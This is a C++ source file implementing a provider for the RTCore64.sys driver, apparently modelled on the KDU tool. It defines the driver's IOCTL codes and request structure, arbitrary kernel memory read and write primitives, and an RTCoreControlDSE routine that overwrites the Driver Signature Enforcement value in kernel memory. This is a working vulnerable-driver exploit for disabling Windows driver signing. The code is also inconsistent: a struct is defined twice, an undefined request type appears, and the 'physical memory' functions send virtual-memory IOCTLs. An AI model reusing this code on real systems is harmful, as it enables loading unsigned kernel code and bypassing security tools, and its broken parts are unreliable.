#include "RTCoreProvider.h"
#include <iostream>
#include <winternl.h>

// RTCore64 IOCTL codes (from reverse engineering)
#define RTCORE64_MEMORY_READ    0x80002048
#define RTCORE64_MEMORY_WRITE   0x8000204C

// RTCore64 structure based on KDU (known working implementation)
typedef struct _RTCORE_REQUEST {
    ULONG_PTR Unknown0;
    ULONG_PTR Address;
    ULONG_PTR Unknown1;
    ULONG Size; // 1, 2, or 4
    ULONG Value;
    ULONG_PTR Unknown2;
    ULONG_PTR Unknown3;
} RTCORE_REQUEST, *PRTCORE_REQUEST;

// Helper for 4-byte primitive read
BOOL RTCoreReadPrimitive(HANDLE DeviceHandle, ULONG_PTR Address, PULONG Value) {
    RTCORE_REQUEST request = { 0 };
    request.Address = Address;
    request.Size = sizeof(ULONG);
    request.Unknown0 = 0; // Padding/Unknown
    
    DWORD bytesReturned = 0;
    // Note: Use same buffer for Input and Output as per KDU implementation
    if (!DeviceIoControl(DeviceHandle, RTCORE64_MEMORY_READ, 
        &request, sizeof(request), 
        &request, sizeof(request), 
        &bytesReturned, NULL)) {
        return FALSE;
    }
    
    *Value = request.Value;
    return TRUE;
}

// Helper for 4-byte primitive write
BOOL RTCoreWritePrimitive(HANDLE DeviceHandle, ULONG_PTR Address, ULONG Value) {
    RTCORE_REQUEST request = { 0 };
    request.Address = Address;
    request.Size = sizeof(ULONG);
    request.Value = Value;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(DeviceHandle, RTCORE64_MEMORY_WRITE, 
        &request, sizeof(request), 
        &request, sizeof(request), 
        &bytesReturned, NULL);
}

BOOL WINAPI ProviderCallbacks::RTCoreStartDriver(PPROVIDER_CONTEXT Context) {
    if (!Context || !Context->DbEntry) {
        return FALSE;
    }
    
    std::wcout << L"[+] Starting RTCore64 provider..." << std::endl;
    
    // Set device name
    Context->DbEntry->DeviceName = L"RTCore64";
    Context->DbEntry->DriverName = L"RTCore64.sys";
    
    // RTCore64 capabilities - KDU confirms it supports Virtual Memory R/W
    // It is primarily a Virtual Memory access driver.
    Context->DbEntry->CapabilityFlags = PROVIDER_CAP_VIRTUAL_MEMORY;
    Context->DbEntry->Type = ProviderTypeVirtualMemory;
    Context->DbEntry->PhysMemoryBruteForce = FALSE;
    Context->DbEntry->PreferPhysical = FALSE;
    
    std::wcout << L"[+] RTCore64 provider initialized with virtual memory capabilities" << std::endl;
    return TRUE;
}

VOID WINAPI ProviderCallbacks::RTCoreStopDriver(PPROVIDER_CONTEXT Context) {
    if (!Context) {
        return;
    }
    
    std::wcout << L"[+] Stopping RTCore64 provider..." << std::endl;
    
    if (Context->DeviceHandle && Context->DeviceHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(Context->DeviceHandle);
        Context->DeviceHandle = NULL;
    }
    
    Context->ProviderState = StateUnloaded;
}

BOOL WINAPI ProviderCallbacks::RTCoreControlDSE(PPROVIDER_CONTEXT Context, ULONG DSEValue, ULONG_PTR Address) {
    if (!Context || !Context->DeviceHandle || Context->DeviceHandle == INVALID_HANDLE_VALUE) {
        std::wcout << L"[!] RTCore64: Invalid context or device handle" << std::endl;
        return FALSE;
    }
    
    std::wcout << L"[+] RTCore64: Attempting DSE control at address 0x" << std::hex << Address 
               << L" with value 0x" << DSEValue << std::endl;
    
    // Read current value first
    ULONG currentValue = 0;
    if (!RTCoreReadKernelVM(Context->DeviceHandle, Address, &currentValue, sizeof(currentValue))) {
        std::wcout << L"[!] RTCore64: Failed to read current DSE value" << std::endl;
        return FALSE;
    }
    
    std::wcout << L"[+] RTCore64: Current DSE value: 0x" << std::hex << currentValue << std::endl;
    
    // Write new value
    if (!RTCoreWriteKernelVM(Context->DeviceHandle, Address, &DSEValue, sizeof(DSEValue))) {
        std::wcout << L"[!] RTCore64: Failed to write new DSE value" << std::endl;
        return FALSE;
    }
    
    // Verify write
    ULONG verifyValue = 0;
    if (!RTCoreReadKernelVM(Context->DeviceHandle, Address, &verifyValue, sizeof(verifyValue))) {
        std::wcout << L"[!] RTCore64: Failed to verify DSE write" << std::endl;
        return FALSE;
    }
    
    if (verifyValue != DSEValue) {
        std::wcout << L"[!] RTCore64: DSE verification failed" << std::endl;
        return FALSE;
    }
    
    std::wcout << L"[+] RTCore64: DSE control successful" << std::endl;
    return TRUE;
}

BOOL WINAPI ProviderCallbacks::RTCoreReadPhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes) {
    if (!DeviceHandle || DeviceHandle == INVALID_HANDLE_VALUE || !Buffer || NumberOfBytes == 0) {
        return FALSE;
    }
    
    RTCORE_MEMORY_REQUEST request = {0};
    request.Address = PhysicalAddress;
    request.Size = NumberOfBytes;
    request.Buffer = Buffer;
    
    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(DeviceHandle,
                                  RTCORE64_MEMORY_READ,
                                  &request,
                                  sizeof(request),
                                  &request,
                                  sizeof(request),
                                  &bytesReturned,
                                  NULL);
    
    if (!result) {
        DWORD error = GetLastError();
        std::wcout << L"[!] RTCore64: Physical memory read failed, error: " << error << std::endl;
    }
    
    return result;
}

BOOL WINAPI ProviderCallbacks::RTCoreWritePhysicalMemory(HANDLE DeviceHandle, ULONG_PTR PhysicalAddress, PVOID Buffer, ULONG NumberOfBytes) {
    if (!DeviceHandle || DeviceHandle == INVALID_HANDLE_VALUE || !Buffer || NumberOfBytes == 0) {
        return FALSE;
    }
    
    RTCORE_MEMORY_REQUEST request = {0};
    request.Address = PhysicalAddress;
    request.Size = NumberOfBytes;
    request.Buffer = Buffer;
    
    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(DeviceHandle,
                                  RTCORE64_MEMORY_WRITE,
                                  &request,
                                  sizeof(request),
                                  &request,
                                  sizeof(request),
                                  &bytesReturned,
                                  NULL);
    
    if (!result) {
        DWORD error = GetLastError();
        std::wcout << L"[!] RTCore64: Physical memory write failed, error: " << error << std::endl;
    }
    
    return result;
}

// RTCore IOCTL definitions (from KDU rtcore.h)
#define RTCORE_DEVICE_TYPE      (DWORD)0x8000
#define RTCORE_FUNCTION_READVM  (DWORD)0x812
#define RTCORE_FUNCTION_WRITEVM (DWORD)0x813

#define IOCTL_RTCORE_READVM     \
    CTL_CODE(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_READVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002048

#define IOCTL_RTCORE_WRITEVM    \
    CTL_CODE(RTCORE_DEVICE_TYPE, RTCORE_FUNCTION_WRITEVM, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x8000204C

typedef struct _RTCORE_REQUEST {
    ULONG_PTR Unknown0;
    ULONG_PTR Address;
    ULONG_PTR Unknown1;
    ULONG Size;
    ULONG Value;
    ULONG_PTR Unknown2;
    ULONG_PTR Unknown3;
} RTCORE_REQUEST, *PRTCORE_REQUEST;

// RTCore driver communication (based on KDU implementation)
BOOL RTCoreCallDriver(HANDLE DeviceHandle, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength) {
    DWORD bytesReturned = 0;
    return DeviceIoControl(
        DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        InputBuffer,
        InputBufferLength,
        &bytesReturned,
        NULL
    );
}

// RTCore memory primitives (following KDU rtcore.cpp)
BOOL RTCoreReadMemoryPrimitive(HANDLE DeviceHandle, ULONG Size, ULONG_PTR Address, PULONG Value) {
    RTCORE_REQUEST request;
    
    *Value = 0;
    
    if ((Size != sizeof(WORD)) && (Size != sizeof(ULONG))) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    
    RtlSecureZeroMemory(&request, sizeof(request));
    request.Address = Address;
    request.Size = Size;
    
    if (RTCoreCallDriver(DeviceHandle, IOCTL_RTCORE_READVM, &request, sizeof(RTCORE_REQUEST))) {
        *Value = request.Value;
        return TRUE;
    }
    
    return FALSE;
}

BOOL RTCoreWriteMemoryPrimitive(HANDLE DeviceHandle, ULONG Size, ULONG_PTR Address, ULONG Value) {
    RTCORE_REQUEST request;
    
    if ((Size != sizeof(WORD)) && (Size != sizeof(ULONG))) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    
    RtlSecureZeroMemory(&request, sizeof(request));
    request.Address = Address;
    request.Size = Size;
    request.Value = Value;
    
    return RTCoreCallDriver(DeviceHandle, IOCTL_RTCORE_WRITEVM, &request, sizeof(RTCORE_REQUEST));
}

// ULONG-based memory access functions for virtual memory support (KDU-style)
BOOL RTCoreReadMemoryULONG(HANDLE DeviceHandle, ULONG_PTR Address, PULONG Value) {
    ULONG valueRead = 0;
    
    *Value = 0;
    
    if (RTCoreReadMemoryPrimitive(DeviceHandle, sizeof(ULONG), Address, &valueRead)) {
        *Value = valueRead;
        return TRUE;
    }
    
    return FALSE;
}

BOOL RTCoreWriteMemoryULONG(HANDLE DeviceHandle, ULONG_PTR Address, ULONG Value) {
    return RTCoreWriteMemoryPrimitive(DeviceHandle, sizeof(ULONG), Address, Value);
}

// Virtual memory access functions based on KDU RTCore implementation
// RTCore64 can access virtual memory directly through its kernel driver interface

// Virtual memory access functions (based on KDU RTCoreReadVirtualMemory/RTCoreWriteVirtualMemory)
BOOL RTCoreReadKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes) {
    // Input buffer length must be aligned to ULONG (following KDU implementation)
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;
    ULONG_PTR virtAddress = Address;
    ULONG valueRead, readBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        if (!RTCoreReadMemoryULONG(DeviceHandle, virtAddress, &valueRead))
            break;

        BufferPtr[i] = valueRead;
        virtAddress += sizeof(ULONG);
        readBytes += sizeof(ULONG);
    }

    return (readBytes == NumberOfBytes);
}

BOOL RTCoreWriteKernelVM(HANDLE DeviceHandle, ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes) {
    // Input buffer length must be aligned to ULONG (following KDU implementation)
    if ((NumberOfBytes % sizeof(ULONG)) != 0)
        return FALSE;

    PULONG BufferPtr = (PULONG)Buffer;
    ULONG_PTR virtAddress = Address;
    ULONG valueWrite, writeBytes = 0;

    for (ULONG i = 0; i < (NumberOfBytes / sizeof(ULONG)); i++) {

        valueWrite = BufferPtr[i];
        if (!RTCoreWriteMemoryULONG(DeviceHandle, virtAddress, valueWrite))
            break;

        virtAddress += sizeof(ULONG);
        writeBytes += sizeof(ULONG);
    }

    return (writeBytes == NumberOfBytes);
}
